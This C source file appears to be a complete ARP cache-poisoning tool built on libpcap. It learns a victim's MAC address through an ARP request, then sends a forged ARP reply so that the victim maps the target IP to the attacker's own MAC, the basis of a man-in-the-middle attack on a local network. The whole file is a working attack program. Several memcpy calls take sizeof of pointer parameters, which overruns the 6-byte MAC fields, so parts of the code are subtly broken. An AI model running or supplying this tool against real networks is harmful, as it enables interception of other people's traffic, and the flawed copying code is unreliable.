#include <stdio.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>

/*Header files to get host's MAC Address*/
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>

#define IP_ADDR_LEN 4
#define SIZE_ETHER_HEADER 14
#pragma pack(push,1)
typedef struct ether_hdr{
    u_char dst_mac[ETHER_ADDR_LEN];
    u_char src_mac[ETHER_ADDR_LEN];
    u_int16_t ether_type;
}ETHER_HEADER;
typedef struct arp_pkt{
    u_int16_t hardware_type;
    u_int16_t protocol_type;
    u_int8_t hardware_size;
    u_int8_t protocol_size;
    u_int16_t opcode;
    u_char senderMAC[ETHER_ADDR_LEN];
    struct in_addr senderIP;
    u_char targetMAC[ETHER_ADDR_LEN];
    struct in_addr targetIP;
}ARP_PKT;
#pragma pack(pop)
void getMyMAC(unsigned char* buffer, char* if_name);
void getMyIP(struct in_addr* myIP, char* if_name);
void getMACbyARP(pcap_t* handle, u_char* targetMAC, struct in_addr myIP, const u_char* myMAC, struct in_addr targetIP);
void printPacket(u_char* packet)
{
    for(int i=0; i<42; i++)
    {
        if (i%16==0)
            printf("\n");
        printf("%.2x ",packet[i]);
    }
    printf("\n");
    return;
}
void createARPrequest(u_char* arp_packet, struct in_addr senderIP, const u_char* senderMAC, struct in_addr targetIP);
void sendPoisoningPacket(pcap_t* handle, const u_char* myMAC, const u_char* senderMAC, struct in_addr targetIP, struct in_addr senderIP);
int main(int argc, char * argv[])
{
    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    unsigned char myMAC[6];
    struct in_addr myIP;
    struct in_addr senderIP;
    struct in_addr targetIP;
    unsigned char senderMAC[6];
    if(argc != 4)
    {
        fprintf(stderr,"Usage: ./main [INTERFACE_NAME] [SENDER_IP] [TARGET_IP]\n");
        return 2;
    }

    dev = argv[1];
    printf("Device: %s\n", dev);
    handle = pcap_open_live(dev,BUFSIZ,1,0,errbuf);
    if(handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }

    getMyMAC(myMAC, argv[1]);
    getMyIP(&myIP, argv[1]);
    senderIP.s_addr = inet_addr(argv[2]);
    targetIP.s_addr = inet_addr(argv[3]);
    printf("sender(victim) IP : %s\n",argv[2]);
    getMACbyARP(handle, senderMAC, myIP, myMAC, senderIP);
    sendPoisoningPacket(handle, myMAC, senderMAC, targetIP, senderIP);


    pcap_close(handle);
    return 0;
}
void getMyMAC(unsigned char* buffer, char* if_name)
{
    struct ifreq myreq;
    int s, sock;
    sock = socket(PF_INET,SOCK_DGRAM,0);
    memset(&myreq, 0x00, sizeof(myreq));
    strcpy(myreq.ifr_name, if_name);
    ioctl(sock, SIOCGIFHWADDR, &myreq);
    close(sock);
    for(s = 0; s < 6; s++)
    {
        buffer[s] = (unsigned char)myreq.ifr_hwaddr.sa_data[s];
    }
    return;
}
void getMyIP(struct in_addr* myIP, char* if_name)
{
    struct ifreq myreq;
    int sock;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    myreq.ifr_addr.sa_family = AF_INET;
    strncpy(myreq.ifr_name, if_name, IFNAMSIZ-1);
    ioctl(sock, SIOCGIFADDR, &myreq);
    close(sock);
    *myIP = ((struct sockaddr_in*)&myreq.ifr_addr)->sin_addr;
    return;
}
void getMACbyARP(pcap_t* handle, u_char* targetMAC, struct in_addr myIP, const u_char* myMAC, struct in_addr targetIP)
{
    u_char arp_packet[42];
    createARPrequest(arp_packet, myIP, myMAC, targetIP);
    printPacket(arp_packet);

    struct pcap_pkthdr* header;
    const u_char* incomingPacket;
    ETHER_HEADER* p_ethhdr;
    ARP_PKT* p_arp;
    int check = 0;


    while(1)
    {
        if(pcap_sendpacket(handle,arp_packet,sizeof(arp_packet)) != 0)
        {
            printf("An error occured while sending ARP request packet\n");
        }
        check = pcap_next_ex(handle,&header,&incomingPacket);

        if(check==1)
        {
            p_ethhdr = (ETHER_HEADER*)incomingPacket;

            if(ntohs(p_ethhdr->ether_type) == ETHERTYPE_ARP)
            {
                p_arp = (ARP_PKT*)(incomingPacket+SIZE_ETHER_HEADER);
                if((p_arp->senderIP.s_addr == targetIP.s_addr) && (ntohs(p_arp->opcode) == ARPOP_REPLY))
                {
                    printf("\nGotcha!");
                    for(int i=0;i<6;i++)
                    {
                        targetMAC[i] = (p_arp->senderMAC)[i];
                    }
                    break;
                }
                else
                    continue;
            }
            else
                continue;
        }
        else
        {
            if(check==0)
            {
                printf("Time Expired!\n");
                return;
            }
            else if(check == -1)
            {
                printf("An Error Occured: %s\n", pcap_geterr(handle));
                return;
            }
            else if(check == -2)
            {
                printf("No More Packets in the file.\n");
                return;
            }
        }
    }

    return;
}
void createARPrequest(u_char* arp_packet, struct in_addr senderIP, const u_char* senderMAC, struct in_addr targetIP)
{
    ETHER_HEADER* eth_header=(ETHER_HEADER*)arp_packet;
    ARP_PKT* arp_pkt = (ARP_PKT*)(arp_packet+SIZE_ETHER_HEADER);
    unsigned char emptyMAC[6] = {0,};

    memset(eth_header->dst_mac,0xff,6);
    memcpy(eth_header->src_mac,senderMAC,sizeof(senderMAC));
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_pkt->hardware_type = htons(ARPHRD_ETHER);
    arp_pkt->protocol_type = htons(ETHERTYPE_IP);
    arp_pkt->hardware_size = 6;
    arp_pkt->protocol_size = 4;
    arp_pkt->opcode = htons(ARPOP_REQUEST);

    memcpy(arp_pkt->senderMAC,senderMAC,sizeof(senderMAC));
    memcpy(arp_pkt->targetMAC,emptyMAC,sizeof(emptyMAC));
    arp_pkt->senderIP = senderIP;
    arp_pkt->targetIP = targetIP;
    return;
}
void createARPreply(u_char* arp_packet, struct in_addr senderIP, const u_char* senderMAC, struct in_addr targetIP, const u_char* targetMAC)
{
    ETHER_HEADER* eth_header=(ETHER_HEADER*)arp_packet;
    ARP_PKT* arp_pkt = (ARP_PKT*)(arp_packet+SIZE_ETHER_HEADER);

    memcpy(eth_header->dst_mac,targetMAC,sizeof(targetMAC));
    memcpy(eth_header->src_mac,senderMAC,sizeof(senderMAC));
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_pkt->hardware_type=htons(ARPHRD_ETHER);
    arp_pkt->protocol_type = htons(ETHERTYPE_IP);
    arp_pkt->hardware_size = 6;
    arp_pkt->protocol_size = 4;
    arp_pkt->opcode = htons(ARPOP_REPLY);

    memcpy(arp_pkt->senderMAC,senderMAC,sizeof(senderMAC));
    memcpy(arp_pkt->targetMAC,targetMAC,sizeof(targetMAC));
    arp_pkt->senderIP = senderIP;
    arp_pkt->targetIP = targetIP;
    return;
}

void sendPoisoningPacket(pcap_t* handle, const u_char* myMAC, const u_char* senderMAC, struct in_addr targetIP, struct in_addr senderIP)
{
    u_char poisoningPacket[42];
    createARPreply(poisoningPacket, targetIP, myMAC, senderIP, senderMAC);
    printPacket(poisoningPacket);
    if(pcap_sendpacket(handle,poisoningPacket,sizeof(poisoningPacket)) != 0)
    {
        printf("An error occured while sending ARP request packet\n");
    }
    return;
}
